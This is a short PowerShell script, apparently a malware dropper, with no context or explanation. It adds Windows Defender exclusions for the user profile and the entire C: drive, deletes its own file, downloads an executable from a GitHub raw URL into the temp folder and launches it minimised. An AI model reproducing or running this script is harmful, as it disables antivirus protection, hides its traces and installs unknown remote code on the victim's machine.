Add-MpPreference -ExclusionPath $env:USERPROFILE
Add-MpPreference -ExclusionPath C:\
Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
$url = 'https://github.com/AnyTXDR/TXDR/raw/refs/heads/main/xxx.exe'
$outputFile = [System.IO.Path]::Combine($env:Temp, 'xxx.exe')
Start-Sleep -Milliseconds 10 
Invoke-WebRequest -Uri $url -OutFile $outputFile
Start-Process -FilePath explorer.exe -ArgumentList "$outputFile" -WindowStyle Minimized